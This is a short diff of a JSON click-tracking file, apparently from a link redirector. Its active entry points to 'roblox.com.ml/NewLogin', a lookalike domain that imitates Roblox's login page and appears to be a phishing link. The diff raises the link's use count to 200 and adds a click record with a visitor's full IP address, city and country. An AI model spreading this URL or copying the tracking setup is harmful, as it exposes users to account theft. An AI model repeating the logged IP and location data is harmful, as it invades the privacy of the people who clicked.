@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 199,
+    "useCount": 200,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1704,6 +1704,14 @@
         "city": "Belgrade",
         "flag": "🇷🇸",
         "countryCode": "RS"
+      },
+      {
+        "timestamp": 1776971755312,
+        "ip": "98.215.226.206",
+        "country": "United States",
+        "city": "Chicago",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
